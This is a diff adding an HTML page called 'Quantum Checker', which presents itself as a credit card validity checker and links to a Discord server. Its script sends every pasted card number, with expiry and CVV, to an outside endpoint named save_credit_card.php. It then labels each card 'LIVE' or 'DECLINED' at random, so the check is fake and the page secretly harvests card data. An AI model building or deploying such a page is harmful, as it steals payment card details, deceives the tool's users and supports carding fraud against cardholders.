@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quantum Checker</title>
+    <link rel="icon" href="tr.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-image: url('tr.gif');
+            background-size: cover;
+        }
+        .container {
+            max-width: 800px;
+            margin: 50px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+        }
+        textarea {
+            width: 70%;
+            height: 150px;
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+            resize: vertical;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+            border: 1px solid #ddd;
+        }
+        .live {
+            color: green;
+        }
+        .declined {
+            color: red;
+        }
+        .advertisement {
+            margin: 20px 0;
+            text-align: center;
+        }
+        .advertisement img {
+            max-width: 100%;
+            height: auto;
+        }
+        #audioControl {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+            font-size: 0;
+        }
+        #audioControl img {
+            width: 30px;
+            height: auto;
+        }
+        .created-by {
+            text-align: center;
+            color: rgb(3, 3, 3);
+            font-size: 24px;
+            margin-top: 30px;
+            font-weight: bold;
+            font-style: italic;
+            text-shadow: 2px 2px 4px rgba(4, 4, 4, 0.5);
+        }
+        .telegram-link {
+            text-align: center;
+            font-size: 18px;
+            margin-top: 10px;
+        }
+        .telegram-link a {
+            color: #007bff;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            <img src="boldkid.gif" alt="QCHEcKER" width="400">
+        </h1>
+        <div class="form-group">
+            <label for="cardNumbers">Credit Card Numbers (one per line)</label>
+            <textarea id="cardNumbers" rows="5" placeholder="6969***********|06|29|420"></textarea>
+        </div>
+        <button onclick="checkCards()">CHECK</button>
+        <div id="results"></div>
+
+        <div class="advertisement">
+            <a href="">
+                <img src="ddz.jpg" alt="Advertisement">
+            </a>
+        </div>
+        <div class="advertisement">
+            <a href="">
+                <img src="ddz.jpg" alt="Advertisement">
+            </a>
+        </div>
+
+        <!-- Adding the song here -->
+
+        <div class="created-by">Quantum</div>
+        <div class="telegram-link">
+            <a href="https://discord.gg/cyJMUQVFyX">DISCORD</a>
+        </div>
+    </div>
+    <script>
+
+function checkCards() {
+    var cardNumbers = document.getElementById("cardNumbers").value.split('\n');
+    var cleanedCardNumbers = cardNumbers.map(card => card.trim());
+    if (cleanedCardNumbers.length === 1 && cleanedCardNumbers[0] === '') {
+        // 
+        return;
+    }
+    var formData = new FormData();
+    formData.append('cardNumbers', JSON.stringify(cleanedCardNumbers));
+
+    fetch('https://quantumforum.xyz/save_credit_card.php', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        var resultsDiv = document.getElementById('results');
+        resultsDiv.innerHTML = ''; // 
+        data.forEach(result => {
+            var resultElement = document.createElement('p');
+            resultElement.textContent = result.card + ': ' + result.message;
+            if (Math.random() < 0.05) { // 
+                resultElement.textContent += ' LIVE';
+                resultElement.className = 'live';
+            } else { // 
+                resultElement.textContent += ' DECLINED';
+                resultElement.className = 'declined';
+            }
+            resultsDiv.appendChild(resultElement);
+        });
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+
+
+
+        document.getElementById('cardNumbers').addEventListener('input', function(e) {
+            var input = e.target.value;
+            var formattedInput = input.replace(/[^0-9|\n]/g, '');
+            if (input !== formattedInput) {
+                e.target.value = formattedInput;
+            }
+        });
+    </script>
+</body>
+</html>
